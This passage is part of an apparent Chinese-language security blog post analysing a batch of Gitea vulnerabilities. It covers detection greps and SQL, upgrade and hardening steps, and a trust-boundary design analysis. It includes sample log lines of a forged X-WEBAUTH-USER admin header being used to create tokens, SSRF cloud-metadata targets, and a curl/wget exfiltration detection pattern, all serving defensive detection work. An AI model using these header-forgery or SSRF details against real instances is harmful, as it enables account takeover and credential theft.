+<span class="w">        </span><span class="na">▼</span>
+<span class="k">[攻击者收集到组织级CI/CD secrets]</span>
+<span class="w">        </span><span class="na">│</span>
+<span class="w">        </span><span class="na">▼</span>
+<span class="k">[横向到部署环境/镜像仓库/云账号]</span>
+</code></pre></div>
+
+<p>这条链的危险在于<strong>权限模型在UI与API之间不对称</strong>——这是API安全里最经典的反模式。</p>
+<hr />
+<h2>7. 检测规则：如何在一周内自证未受影响</h2>
+<p>以下规则按"漏洞 → grep规则 → 日志特征"组织，可直接套用到自建Gitea实例。</p>
+<h3>7.1 CVE-2026-20896（认证绕过）</h3>
+<p><strong>配置侧grep</strong>（在Gitea容器/二进制所在主机执行）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 查找所有 app.ini，确认 REVERSE_PROXY_TRUSTED_PROXIES 是否为 *</span>
+find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;app.ini&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>grep<span class="w"> </span>-nE<span class="w"> </span><span class="s2">&quot;REVERSE_PROXY_(TRUSTED_PROXIES|AUTHENTICATION_USER)&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 预期（安全）：</span>
+<span class="c1">#   /data/gitea/conf/app.ini:42: REVERSE_PROXY_TRUSTED_PROXIES = 127.0.0.0/8,::1/128</span>
+<span class="c1"># 风险：</span>
+<span class="c1">#   /data/gitea/conf/app.ini:42: REVERSE_PROXY_TRUSTED_PROXIES = *</span>
+</code></pre></div>
+
+<p><strong>访问日志特征</strong>：被利用时，日志里会出现"无登录态但用户身份非空"的请求。可疑模式：</p>
+<div class="highlight"><pre><span></span><code># Gitea access log（router log）
+... &quot;GET / HTTP/1.1&quot; 200 ... &quot;X-WEBAUTH-USER: admin&quot; ...
+... &quot;POST /api/v1/users/admin/tokens HTTP/1.1&quot; 201 ... &quot;X-WEBAUTH-USER: admin&quot; ...
+</code></pre></div>
+
+<p>排查SQL（以SQLite为例）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-- 找出最近7天通过X-WEBAUTH-USER登录的会话</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">created_unix</span><span class="p">,</span><span class="w"> </span><span class="n">ip</span>
+<span class="k">FROM</span><span class="w"> </span><span class="k">session</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">created_unix</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%s&#39;</span><span class="p">,</span><span class="s1">&#39;now&#39;</span><span class="p">,</span><span class="s1">&#39;-7 days&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">is_admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
+<span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">created_unix</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span>
+</code></pre></div>
+
+<h3>7.2 CVE-2026-22874（SSRF）</h3>
+<p><strong>配置侧grep</strong>：检查webhook/migrate是否对普通用户开放：</p>
+<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-nE<span class="w"> </span><span class="s2">&quot;ALLOWED_HOSTS|SSRF|WEBHOOK&quot;</span><span class="w"> </span>/data/gitea/conf/app.ini
+</code></pre></div>
+
+<p><strong>访问日志特征</strong>：webhook delivery的目标URL指向元数据或CGN地址。可在<code>webhook</code>表里直接查：</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">repo_id</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">created_unix</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">webhook</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%169.254%&#39;</span><span class="w">        </span><span class="c1">-- link-local 元数据</span>
+<span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%100.64.%&#39;</span><span class="w">         </span><span class="c1">-- RFC 6598 CGN</span>
+<span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%metadata.google.internal%&#39;</span>
+<span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%metadata.azure.com%&#39;</span>
+<span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">created_unix</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span>
+</code></pre></div>
+
+<p><strong>出站流量特征</strong>（在主机netflow里）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 抓Gitea进程对169.254.169.254的出站连接</span>
+tcpdump<span class="w"> </span>-nn<span class="w"> </span>-i<span class="w"> </span>any<span class="w"> </span><span class="s1">&#39;host 169.254.169.254 and tcp port 80&#39;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
+<h3>7.3 CVE-2026-20779（TOTP重放）</h3>
+<p><strong>日志特征</strong>：同一用户在同一秒内出现多个不同surface的TOTP验证。Gitea的<code>log</code>表（或外部日志系统）里可查询：</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">created_unix</span><span class="p">,</span><span class="w"> </span><span class="n">description</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">log</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%TOTP%&#39;</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">created_unix</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%s&#39;</span><span class="p">,</span><span class="s1">&#39;now&#39;</span><span class="p">,</span><span class="s1">&#39;-7 days&#39;</span><span class="p">)</span>
+<span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">created_unix</span><span class="p">;</span>
+<span class="c1">-- 异常：同一 user_id 在 &lt; 5秒 内出现 ≥2 条 TOTP 记录</span>
+</code></pre></div>
+
+<h3>7.4 CVE-2026-27775（多ref push权限缓存）</h3>
+<p><strong>日志特征</strong>：单次push同时更新多个ref，且其中包含受保护分支。可从git hook日志或Gitea的<code>repo</code>审计日志中提取：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Gitea log中查找 multi-ref push</span>
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;refs/heads/(main|master|release/)&quot;</span><span class="w"> </span>/data/gitea/log/gitea.log<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>awk<span class="w"> </span>-F<span class="s1">&#39;refs/&#39;</span><span class="w"> </span><span class="s1">&#39;{print NF-1, $0}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;$1&gt;1{print}&#39;</span>
+</code></pre></div>
+
+<h3>7.5 GHSA-rjvx-x5h2-6px5（API fork绕过）</h3>
+<p><strong>审计SQL</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-- 找出组织名下的fork仓库，其创建者不是组织owner</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">owner_id</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">is_fork</span><span class="p">,</span><span class="w"> </span><span class="n">u</span><span class="p">.</span><span class="n">login</span><span class="p">,</span><span class="w"> </span><span class="n">u</span><span class="p">.</span><span class="n">is_admin</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">repository</span><span class="w"> </span><span class="n">r</span>
+<span class="k">JOIN</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">owner_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">u</span><span class="p">.</span><span class="n">id</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">is_fork</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">owner_id</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">  </span><span class="c1">-- type=1 组织</span>
+<span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">created_unix</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span>
+</code></pre></div>
+
+<p><strong>工作流审计</strong>：检查近期是否有仓库在push后立刻执行了含<code>curl</code>/<code>wget</code>外发的workflow：</p>
+<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-path<span class="w"> </span><span class="s2">&quot;*/.gitea/workflows/*.yml&quot;</span><span class="w"> </span>-newer<span class="w"> </span>/tmp/marker<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>xargs<span class="w"> </span>grep<span class="w"> </span>-lE<span class="w"> </span><span class="s2">&quot;curl|wget|http&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
+<hr />
+<h2>8. 修复方案：升级 + 配置加固 + 云侧防御</h2>
+<h3>8.1 升级到1.26.4+</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Docker</span>
+docker<span class="w"> </span>pull<span class="w"> </span>gitea/gitea:1.26.4
+docker<span class="w"> </span>compose<span class="w"> </span>down<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>docker<span class="w"> </span>compose<span class="w"> </span>up<span class="w"> </span>-d
+
+<span class="c1"># 二进制</span>
+wget<span class="w"> </span>https://dl.gitea.com/gitea/1.26.4/gitea-1.26.4-linux-amd64
+chmod<span class="w"> </span>+x<span class="w"> </span>gitea-1.26.4-linux-amd64
+mv<span class="w"> </span>gitea-1.26.4-linux-amd64<span class="w"> </span>/usr/local/bin/gitea
+systemctl<span class="w"> </span>restart<span class="w"> </span>gitea
+</code></pre></div>
+
+<p>升级后务必执行<code>gitea doctor</code>，确认配置一致性。</p>
+<h3>8.2 收紧REVERSE_PROXY_TRUSTED_PROXIES</h3>
+<p>即使升级到1.26.4，仍建议在<code>app.ini</code>里显式写死可信反代网段，避免任何后续模板回归：</p>
+<div class="highlight"><pre><span></span><code><span class="k">[security]</span>
+<span class="na">REVERSE_PROXY_AUTHENTICATION_USER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">enabled</span>
+<span class="na">REVERSE_PROXY_TRUSTED_PROXIES</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s">127.0.0.0/8,::1/128,10.0.0.0/8</span>
+<span class="na">REVERSE_PROXY_LIMITER</span><span class="w">            </span><span class="o">=</span><span class="w"> </span><span class="s">enabled</span>
+</code></pre></div>
+
+<p>并在网络层用防火墙把3000端口限定到反代源IP：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># iptables示例：只允许反代（10.0.0.5）访问3000</span>
+iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-s<span class="w"> </span><span class="m">10</span>.0.0.5<span class="w"> </span>-j<span class="w"> </span>ACCEPT
+iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-j<span class="w"> </span>DROP
+</code></pre></div>
+
+<h3>8.3 强制IMDSv2并加网络策略</h3>
+<p>针对CVE-2026-22874，云侧加固比应用侧更可靠：</p>
+<p><strong>AWS EC2</strong>：强制IMDSv2，并要求Token hop-limit=1：</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ec2<span class="w"> </span>modify-instance-metadata-options<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--instance-id<span class="w"> </span>i-xxxxxxxx<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--http-tokens<span class="w"> </span>required<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--http-put-response-hop-limit<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--http-endpoint<span class="w"> </span>enabled
+</code></pre></div>
+
+<p><strong>K8s NetworkPolicy</strong>：禁止Gitea Pod访问元数据地址：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">networking.k8s.io/v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">NetworkPolicy</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gitea-deny-metadata</span>
+<span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gitea</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">podSelector</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">matchLabels</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gitea</span>
+<span class="w">  </span><span class="nt">policyTypes</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Egress</span>
+<span class="w">  </span><span class="nt">egress</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">to</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">ipBlock</span><span class="p">:</span>
+<span class="w">            </span><span class="nt">cidr</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0.0.0.0/0</span>
+<span class="w">            </span><span class="nt">except</span><span class="p">:</span>
+<span class="w">              </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">169.254.169.254/32</span>
+<span class="w">              </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">100.64.0.0/10</span>
+<span class="w">              </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10.0.0.0/8</span><span class="w">      </span><span class="c1"># 视实际内网规划调整</span>
+</code></pre></div>
+
+<h3>8.4 禁用/收紧Actions fork路径</h3>
+<p>短期：在组织层面禁用"普通成员fork到组织名下"：</p>
+<div class="highlight"><pre><span></span><code><span class="k">[repository]</span>
+<span class="na">DISABLE_FORKS_TO_ORG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">true</span><span class="w">   </span><span class="c1">; Gitea 1.26.4+新增配置项</span>
+</code></pre></div>
+
+<p>长期：把组织级secrets改为"按仓库授权"模型，仅对显式信任的仓库下发，避免被fork仓库继承。</p>
+<h3>8.5 加固矩阵</h3>
+<table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>升级1.26.4</th>
+<th>配置加固</th>
+<th>网络层加固</th>
+<th>监控</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2026-20896</td>
+<td>必须</td>
+<td>写死TRUSTED_PROXIES</td>
+<td>限制3000端口源</td>
+<td>X-WEBAUTH-USER日志</td>
+</tr>
+<tr>
+<td>CVE-2026-22874</td>
+<td>必须</td>
+<td>收紧webhook白名单</td>
+<td>NetworkPolicy + IMDSv2</td>
+<td>webhook目标URL审计</td>
+</tr>
+<tr>
+<td>CVE-2026-20779</td>
+<td>必须</td>
+<td>—</td>
+<td>—</td>
+<td>TOTP频率监控</td>
+</tr>
+<tr>
+<td>CVE-2026-27775</td>
+<td>必须</td>
+<td>—</td>
+<td>—</td>
+<td>multi-ref push告警</td>
+</tr>
+<tr>
+<td>GHSA-rjvx-x5h2-6px5</td>
+<td>必须</td>
+<td>DISABLE_FORKS_TO_ORG</td>
+<td>—</td>
+<td>fork到组织审计</td>
+</tr>
+<tr>
+<td>CVE-2026-58443</td>
+<td>必须</td>
+<td>—</td>
+<td>—</td>
+<td>token scope审计</td>
+</tr>
+<tr>
+<td>CVE-2026-58426</td>
+<td>必须</td>
+<td>—</td>
+<td>runner隔离</td>
+<td>artifact跨仓读取告警</td>
+</tr>
+<tr>
+<td>CVE-2026-56750</td>
+<td>必须</td>
+<td>缩短Remember-Me TTL</td>
+<td>—</td>
+<td>异地登录告警</td>
+</tr>
+<tr>
+<td>CVE-2026-24451</td>
+<td>必须</td>
+<td>定期review私有化fork</td>
+<td>—</td>
+<td>fork sync失败日志</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>9. 信任边界设计模式分析：5个洞的共因</h2>
+<p>把5个Critical/High放到一起看，它们不是孤立的bug，而是同一个设计哲学的五个症状。</p>
+<h3>9.1 共因一：默认信任（Trust by Default）</h3>
+<table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>默认信任了什么</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2026-20896</td>
+<td>默认信任任何源IP的X-WEBAUTH-USER</td>
+</tr>
+<tr>
+<td>CVE-2026-22874</td>
+<td>默认信任Go标准库的IsPrivate()覆盖完整</td>
+</tr>
+<tr>
+<td>CVE-2026-27775</td>
+<td>默认信任"第一个ref的权限=后续ref的权限"</td>
+</tr>
+<tr>
+<td>GHSA-rjvx-x5h2-6px5</td>
+<td>默认信任"API与UI权限模型一致"</td>
+</tr>
+<tr>
+<td>CVE-2026-58426</td>
+<td>默认信任HMAC签名scope不会被歧义解析</td>
+</tr>
+</tbody>
+</table>
+<p>"默认信任"在工程上能减少配置摩擦，但在安全上等于把开关默认设为"开"。修复方向是<strong>Default Deny</strong>：所有跨边界声明必须显式配置可信来源，未配置即拒绝。</p>
+<h3>9.2 共因二：边界对称性缺失</h3>
+<p>CVE-2026-20779（TOTP三套<code>usedOTP</code>集合）和GHSA-rjvx-x5h2-6px5（UI/API权限不一致）都是同一类问题：<strong>同一个语义概念在不同入口有不同的实现</strong>。</p>
+<div class="highlight"><pre><span></span><code>       语义：用户是否有权创建组织仓库
+                    │
+        ┌───────────┴───────────┐
+        ▼                       ▼
+   Web UI检查              API fork端点
+   CanCreateOrgRepo        （未检查）
+        │                       │
+        ▼                       ▼
+     拦截普通成员           允许任意成员fork
+</code></pre></div>
+
+<p>设计原则应是：<strong>权限决策必须收敛到单一函数</strong>，所有入口调用同一实现。任何"复制粘贴的权限判断"都是未来漏洞的种子。</p>
+<h3>9.3 共因三：状态缓存与时间窗口</h3>
+<p>CVE-2026-27775（权限缓存）和CVE-2026-20779（TOTP TOCTOU）都涉及"检查"与"使用"之间的时间窗口。缓存是性能优化的必需品，但缓存的对象必须是<strong>不可变事实</strong>（如"该用户是否存在"），而不是<strong>可变权限</strong>（如"该用户当前是否有写权限"）。</p>
+<div class="highlight"><pre><span></span><code>   错误模式：                       正确模式：
+   ┌─────────────┐                  ┌─────────────┐
+   │ check(ref1) │ ──缓存──▶        │ check(ref1) │
+   └─────────────┘                  └──────┬──────┘
+                                          │ 不缓存
+   ┌─────────────┐                         ▼
+   │ use(ref2)   │ ◀──复用缓存          ┌─────────────┐
+   └─────────────┘                      │ check(ref2) │
+                                        └──────┬──────┘
+                                               ▼
+                                        ┌─────────────┐
+                                        │ use(ref2)   │
+                                        └─────────────┘
+</code></pre></div>
+
+<h3>9.4 共因四：依赖外部组件的安全语义</h3>
+<p>CVE-2026-22874把SSRF防御委托给Go标准库<code>net.IP.IsPrivate()</code>，但标准库的"private"语义与平台安全所需的"不可达"语义并不等价。这是供应链安全里的经典陷阱：</p>
+<div class="highlight"><pre><span></span><code>   平台需求：阻止访问任何&quot;非公网&quot;地址
+        │
+        │ 委托
+        ▼
+   Go标准库 IsPrivate()
+        │
+        │ 语义：RFC 1918 + 部分扩展
+        │ 缺失：RFC 6598, link-local元数据, 云商自定义
+        ▼
+   防御盲区
+</code></pre></div>
+
+<p>修复原则：<strong>外部组件只作参考，安全决策必须由平台自己定义边界</strong>。把"私有地址列表"作为平台配置项维护，而不是假设标准库会覆盖所有场景。</p>
+<h3>9.5 共因五：隔离边界用密码学但scope歧义</h3>
+<p>CVE-2026-58426（HMAC签名歧义）属于这一类。HMAC本身是可靠的，但HMAC的输入消息如果允许"歧义解析"（例如<code>repo_id:artifact_path</code>没有定长分隔，<code>12:3</code>可被解析为repo=1 path=2:3或repo=12 path=3），就等于把密码学边界降级为字符串边界。修复方法是<strong>使用长度前缀或结构化编码（如CBOR/protobuf）</strong>，杜绝歧义。</p>
+<hr />
+<h2>10. 给DevOps平台方的三条工程化建议</h2>
+<h3>10.1 建立"信任边界清单"</h3>
+<p>每个平台组件都应维护一份显式的信任边界清单，例如：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">trust_boundaries</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">reverse_proxy</span>
+<span class="w">    </span><span class="nt">inbound_trust</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">127.0.0.0/8</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="p p-Indicator">::</span><span class="nv">1/128</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">enforced_by</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app.ini + iptables</span>
+<span class="w">    </span><span class="nt">owner</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">platform-team</span>
+<span class="w">    </span><span class="nt">review_cadence</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">quarterly</span>
+
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ssrf_egress</span>
+<span class="w">    </span><span class="nt">blocked_cidr</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">169.254.0.0/16</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">100.64.0.0/10</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">0.0.0.0/8</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">enforced_by</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gitea filter + NetworkPolicy</span>
+<span class="w">    </span><span class="nt">owner</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">platform-team</span>
+<span class="w">    </span><span class="nt">review_cadence</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">monthly</span>
+
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">artifact_scope</span>
+<span class="w">    </span><span class="nt">signed_by</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">HMAC-SHA256</span>
+<span class="w">    </span><span class="nt">encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">length-prefixed</span>
+<span class="w">    </span><span class="nt">enforced_by</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions runner</span>
+<span class="w">    </span><span class="nt">owner</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ci-team</span>
+<span class="w">    </span><span class="nt">review_cadence</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">on-change</span>
+</code></pre></div>
+
+<p>每次发布前对照清单逐项核对。</p>
+<h3>10.2 引入"权限决策单一来源"</h3>
+<p>把所有<code>Can(user, action, resource)</code>调用收敛到一个service，强制所有入口（Web、API、git hook、Actions runner）都走这个service。任何新入口必须先在service里注册action，否则编译期失败。</p>
+<h3>10.3 把advisory映射到信任边界</h3>
+<p>安全advisory进来时，先做"信任边界归类"而不是"CVSS排序"。同一个信任边界上的多个洞，即使CVSS不高，也应作为一组issue处理，因为它们往往指向同一个设计缺陷。本次Gitea的9个CVE，按信任边界归类后，5条边界各有1-2个洞——这就是"设计缺陷的回声"。</p>
+<hr />
+<h2>11. 结语</h2>
+<p>把这5个Critical/High放到一起看，最大的教训不是"哪个header没校验"或"哪个标准库有盲区"，而是：<strong>DevOps平台是信任的中枢，它的每一个边界都值得被显式建模</strong>。</p>
+<ul>
+<li>网络信任：谁可以注入身份声明？</li>
+<li>网络安全：谁可以触发出站请求？去哪？</li>
+<li>认证信任：OTP的"单次有效"在哪个范围内成立？</li>
+<li>权限信任：UI和API的权限模型是否同构？</li>
+<li>任务隔离信任：密码学边界是否被编码歧义架空？</li>
+</ul>
+<p>回答清楚这五个问题，比追着CVSS打补丁更接近本质。Gitea这次的集中披露，对整个DevOps平台生态都是一份免费的架构审计报告——值得每个自建平台的人逐条对照。</p>
+<p>升级到1.26.4+，收紧<code>REVERSE_PROXY_TRUSTED_PROXIES</code>，强制IMDSv2，把组织secrets改成按仓库授权。这三件事本周内就能做完，剩下的设计层重构可以排进下个季度的hardening sprint。</p>
+<hr />
+<p><em>本文基于Gitea官方安全公告与公开PoC整理，漏洞利用细节仅用于防御性检测与加固。</em></p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
